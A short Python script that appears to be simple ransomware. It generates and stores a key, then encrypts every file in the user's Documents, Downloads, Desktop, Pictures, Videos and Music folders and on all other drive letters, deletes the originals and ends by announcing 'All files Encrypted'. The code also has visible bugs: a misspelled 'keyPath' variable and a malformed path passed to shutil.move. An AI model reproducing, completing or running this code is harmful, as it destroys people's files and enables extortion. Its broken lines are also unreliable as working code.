import os
import secrets
import pyAesCrypt
import shutil

Username = os.getlogin()

KeyPath =  f"C:/Users/{Username}/3d Objects/Key.txt"

Key =      secrets.token_hex(16)
KeyExist = os.path.exists(KeyPath)

# Check to see if the file exists. If it doesn't, then we make it
if not KeyExist:
    with open (keyPath, "w") as KeyFile:
        Key = KeyFile.write(Key)
with open (KeyPath, "r") as KeyFile:
    Key = KeyFile.read().rstrip()

def EncryptFiles():
    for folder_path in folders_path:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                if not file.endswith(".TCFCrypt"):
                    try:
                        bufferSize = 64 * 1024
                        pyAesCrypt.encrypt_file(file_path, file_path + ".TCFCrypt", Key, bufferSize)
                        destination_path = os.path.join(root, "encrypted_" + file + ".TCFCrypt")
                        shutil.move(file_path + "TCFCrypt",destination_path)
                        os.remove(file_path)
                    except (ValueError, PermissionError) as e:
                        print(f"An Error Occurred: {e}")

# Check if have any other drive
found_drives = [f"{drive_letter}:\\" for drive_letter in map(chr, range(68,91)) if os.path.exists(f"{drive_letter}:\\")]
folders_path = [
    os.path.join(os.path.expanduser("~"), "Documents"),
    os.path.join(os.path.expanduser("~"), "Downloads"),
    os.path.join(os.path.expanduser("~"), "Desktop"),
    os.path.join(os.path.expanduser("~"), "Pictures"),
    os.path.join(os.path.expanduser("~"), "Videos"),
    os.path.join(os.path.expanduser("~"), "Music")
]
folders_path.extend(found_drives)

EncryptFiles()

input("All files Encrypted")